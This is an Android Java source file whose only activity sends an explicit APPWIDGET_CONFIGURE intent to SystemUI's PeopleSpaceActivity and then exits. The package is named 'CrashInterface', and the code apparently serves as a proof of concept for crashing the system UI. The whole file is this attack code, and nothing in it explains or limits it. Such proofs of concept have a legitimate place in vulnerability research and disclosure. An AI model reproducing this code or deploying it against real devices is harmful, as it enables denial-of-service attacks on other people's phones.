package com.loremio.CrashInterface;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent sendIntent = new Intent();
		    sendIntent.setAction("android.appwidget.action.APPWIDGET_CONFIGURE");
		    sendIntent.setClassName("com.android.systemui", "com.android.systemui.people.PeopleSpaceActivity");
		    startActivity(sendIntent);
		    finish();
    }
}
